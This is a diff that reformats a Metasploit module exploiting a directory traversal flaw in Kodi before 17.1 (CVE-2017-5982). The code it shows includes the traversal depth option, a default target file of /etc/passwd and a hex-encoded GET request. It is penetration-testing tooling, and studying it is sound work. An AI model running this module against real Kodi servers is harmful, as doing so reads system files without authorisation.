@@ -9,32 +9,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Kodi 17.0 Local File Inclusion Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal flaw found in Kodi before 17.1.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Kodi 17.0 Local File Inclusion Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal flaw found in Kodi before 17.1.
+        },
+        'References' => [
           ['CVE', '2017-5982'],
         ],
-      'Author'         =>
-        [
-          'Eric Flokstra',  #Original
+        'Author' => [
+          'Eric Flokstra', # Original
           'jvoisin'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2017-02-12'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2017-02-12',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
-        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
-        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ])
+        OptString.new('FILE', [true, 'The file to obtain', '/etc/passwd']),
+        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10])
+      ]
+    )
   end
-
 
   def run_host(ip)
     base = normalize_uri(target_uri.path)
@@ -51,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(base, Rex::Text.uri_encode(f, "hex-all"))
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri
+      'uri' => uri
     })
 
     if res and res.code != 200
